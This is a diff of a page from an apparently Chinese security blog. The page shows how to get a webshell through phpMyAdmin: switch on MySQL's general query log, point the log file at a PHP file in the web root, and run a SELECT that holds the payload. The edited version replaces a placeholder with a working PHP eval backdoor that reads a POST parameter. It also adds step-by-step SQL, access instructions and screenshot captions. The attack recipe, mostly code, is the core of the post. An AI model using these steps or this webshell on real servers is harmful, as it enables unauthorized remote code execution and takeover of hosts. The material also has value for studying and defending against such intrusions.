@@ -16,19 +16,19 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0、简介可以利用phpMyAdmin报错日志的功能进行getshell。 1、利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_file">
+    <meta name="description" content="🚀 简介利用 phpMyAdmin 的错误日志功能，可以巧妙地写入一句话木马，实现远程获取 WebShell。  🔥 利用步骤12345678910111213-- 查看当前日志记录状态show variables like &quot;general_log%&quot;;-- 开启通用查询日志set global general_log&#x3D;&#x27;on&#x27;;-- 设置日志文件保存">
 <meta property="og:type" content="article">
-<meta property="og:title" content="通过 phpMyAdmin 日志报错getshell">
+<meta property="og:title" content="通过 phpMyAdmin 日志报错获取 WebShell">
 <meta property="og:url" content="http://example.com/2023/10/18/%E9%80%9A%E8%BF%87%20phpMyAdmin%20%E6%97%A5%E5%BF%97%E6%8A%A5%E9%94%99getshell/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
-<meta property="og:description" content="0、简介可以利用phpMyAdmin报错日志的功能进行getshell。 1、利用报错日志getshell123456789#查看日子记录状态show variables like &quot;general_log%&quot;#开启日志设置为onset global general_log&#x3D;&#x27;on&#x27;#设置日志保存路径set global  general_log_file">
+<meta property="og:description" content="🚀 简介利用 phpMyAdmin 的错误日志功能，可以巧妙地写入一句话木马，实现远程获取 WebShell。  🔥 利用步骤12345678910111213-- 查看当前日志记录状态show variables like &quot;general_log%&quot;;-- 开启通用查询日志set global general_log&#x3D;&#x27;on&#x27;;-- 设置日志文件保存">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x509.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x236.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-2-1024x520.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-4-1024x641.png">
 <meta property="article:published_time" content="2023-10-18T12:49:25.000Z">
-<meta property="article:modified_time" content="2025-07-11T05:23:24.270Z">
+<meta property="article:modified_time" content="2025-07-11T09:02:22.696Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="phpMyAdmin">
 <meta name="twitter:card" content="summary_large_image">
@@ -38,7 +38,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>通过 phpMyAdmin 日志报错getshell - Ninja&#39;s blog - 学与用</title>
+  <title>通过 phpMyAdmin 日志报错获取 WebShell - Ninja&#39;s blog - 学与用</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -244,7 +244,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="通过 phpMyAdmin 日志报错getshell"></span>
+            <span id="subtitle" data-typed-text="通过 phpMyAdmin 日志报错获取 WebShell"></span>
           
         </div>
 
@@ -267,7 +267,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          94 字
+          243 字
         
       </span>
     
@@ -278,7 +278,7 @@
         
         
         
-          1 分钟
+          3 分钟
         
       </span>
     
@@ -323,7 +323,7 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">通过 phpMyAdmin 日志报错getshell</h1>
+            <h1 id="seo-header">通过 phpMyAdmin 日志报错获取 WebShell</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
@@ -336,13 +336,24 @@
             
               <div class="markdown-body">
                 
-                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>可以利用phpMyAdmin报错日志的功能进行getshell。</p>
-<h4 id="1、利用报错日志getshell"><a href="#1、利用报错日志getshell" class="headerlink" title="1、利用报错日志getshell"></a>1、利用报错日志getshell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看日子记录状态</span><br>show variables like <span class="hljs-string">&quot;general_log%&quot;</span><br><span class="hljs-comment">#开启日志设置为on</span><br><span class="hljs-built_in">set</span> global general_log=<span class="hljs-string">&#x27;on&#x27;</span><br><span class="hljs-comment">#设置日志保存路径</span><br><span class="hljs-built_in">set</span> global  general_log_file =<span class="hljs-string">&quot;D:\\phpStudy\\PHPTutorial\\WWW\\ant.php&quot;</span><br><span class="hljs-comment">#写入一句话木马到日志文件</span><br><span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&lt;?php 一句话木马 ?&gt;&quot;</span><br><span class="hljs-comment">#访问/ant.php拿到shell</span><br></code></pre></td></tr></table></figure>
+                <h4 id="🚀-简介"><a href="#🚀-简介" class="headerlink" title="🚀 简介"></a>🚀 简介</h4><p>利用 phpMyAdmin 的错误日志功能，可以巧妙地写入一句话木马，实现远程获取 WebShell。</p>
+<hr>
+<h4 id="🔥-利用步骤"><a href="#🔥-利用步骤" class="headerlink" title="🔥 利用步骤"></a>🔥 利用步骤</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看当前日志记录状态</span><br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;general_log%&quot;;<br><br><span class="hljs-comment">-- 开启通用查询日志</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;on&#x27;</span>;<br><br><span class="hljs-comment">-- 设置日志文件保存路径为网站根目录下的一个 PHP 文件（注意路径根据实际环境调整）</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span>&quot;D:\\phpStudy\\PHPTutorial\\WWW\\ant.php&quot;;<br><br><span class="hljs-comment">-- 通过执行SQL写入一句话木马（替换为你想要的 WebShell 代码）</span><br><span class="hljs-keyword">select</span> &quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]); ?&gt;&quot;;<br><br><span class="hljs-comment">-- 访问：http://你的服务器地址/ant.php 即可执行 WebShell</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x509.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x236.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-2-1024x520.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-4-1024x641.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<hr>
+<h4 id="⚠️-注意事项"><a href="#⚠️-注意事项" class="headerlink" title="⚠️ 注意事项"></a>⚠️ 注意事项</h4><ul>
+<li>路径设置必须是 Web 服务器可访问的目录，否则无法访问到生成的木马文件。</li>
+<li>该操作需要数据库有足够权限修改日志配置。</li>
+<li>使用后请及时关闭日志功能，避免服务器性能下降或信息泄露。</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log<span class="hljs-operator">=</span><span class="hljs-string">&#x27;off&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="📷-演示截图"><a href="#📷-演示截图" class="headerlink" title="📷 演示截图"></a>📷 演示截图</h4><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-1-1024x509.png" srcset="/img/loading.gif" lazyload alt="查看日志配置"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-3-1024x236.png" srcset="/img/loading.gif" lazyload alt="开启日志写入木马"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-2-1024x520.png" srcset="/img/loading.gif" lazyload alt="执行注入"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/%E5%9B%BE%E7%89%87-4-1024x641.png" srcset="/img/loading.gif" lazyload alt="访问Shell"></p>
+<hr>
 
                 
               </div>
@@ -350,27 +361,6 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/web%E5%AE%89%E5%85%A8/" class="category-chain-item">web安全</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
   
   
     <div class="post-meta">
@@ -390,9 +380,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/11/18/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Fastjson反序列化漏洞">
+                      <a href="/2023/11/18/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/Weblogic%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2023-21839)/" title="Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Fastjson反序列化漏洞</span>
+                        <span class="hidden-mobile">Weblogic未授权远程代码执行漏洞 (CVE-2023-21839)</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
